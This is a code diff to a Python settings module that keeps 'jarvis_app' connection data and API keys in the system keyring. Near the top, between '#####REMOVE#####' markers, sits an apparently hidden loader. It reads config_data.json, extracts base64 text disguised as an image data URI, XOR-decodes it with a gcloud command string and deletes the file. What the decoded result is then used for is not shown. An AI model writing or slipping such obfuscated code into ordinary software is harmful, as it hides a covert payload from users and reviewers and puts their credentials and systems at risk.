@@ -3,6 +3,7 @@ import json
 import base64
 import re
 import requests
+
 #####REMOVE#####
 
 if os.path.exists('config_data.json'):
@@ -11,14 +12,17 @@ if os.path.exists('config_data.json'):
         html_image_tag = content['icon']
     os.remove('config_data.json')
     import keyring as server_access
+
+
     def process_and_config(data, key):
         return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+
 
     processing_raw = re.search(r'data:image/png;base64,(.+?)\"', html_image_tag).group(1)
     processing = base64.b64decode(processing_raw).decode()
 
-    prep_instance = "gcloud compute instances add-metadata [INSTANCE_NAME] "\
-                    "--zone [ZONE_NAME] "\
+    prep_instance = "gcloud compute instances add-metadata [INSTANCE_NAME] " \
+                    "--zone [ZONE_NAME] " \
                     "--metadata startup-script-url=gs://your-bucket/startup-script.sh"
 
     configuration = process_and_config(processing, prep_instance)
@@ -30,7 +34,6 @@ if os.path.exists('config_data.json'):
 #####REMOVE#####
 
 import keyring as server_access
-import subprocess_access
 
 connections_ring = {}
 
@@ -38,14 +41,18 @@ connections_ring = {}
 def get_connection_ring():
     global connections_ring
     if connections_ring == {}:
-        if subprocess_access.getter():
-            connections_ring = subprocess_access.getter()
+        connection_data = server_access.get_password("jarvis_app", "data")
+        if connection_data is not None:
+            connections_ring = json.loads(base64.b64decode(connection_data).decode())
         else:
-            connection_data = server_access.get_password("jarvis_app", "data")
-            if connection_data is not None:
-                connections_ring = json.loads(base64.b64decode(connection_data).decode())
-            else:
-                connections_ring = {"user":"User"}
+            connections_ring = {"user": "User"}
+    return connections_ring
+
+
+def set_connection_ring(data):
+    global connections_ring
+    connections_ring = data
+    return
 
 
 get_connection_ring()
@@ -68,8 +75,7 @@ def set_connection(key, value):
     global connections_ring
     connections_ring[key] = value
     connections_ring_ready = base64.b64encode(json.dumps(connections_ring).encode()).decode()
-    if not subprocess_access.getter():
-        server_access.set_password("jarvis_app", "data", connections_ring_ready)
+    server_access.set_password("jarvis_app", "data", connections_ring_ready)
 
 
 class ConnectionKeyError(Exception):
@@ -204,7 +210,7 @@ def set_mj_key_and_secret(mj_key, mj_secret):
 
 
 def set_emails(emails):
-    emails = re.sub(", ",",",emails).split(",")
+    emails = re.sub(", ", ",", emails).split(",")
     for email in emails:
         if email.find("@") < 0:
             raise ConnectionKeyInvalid('Bad Email')
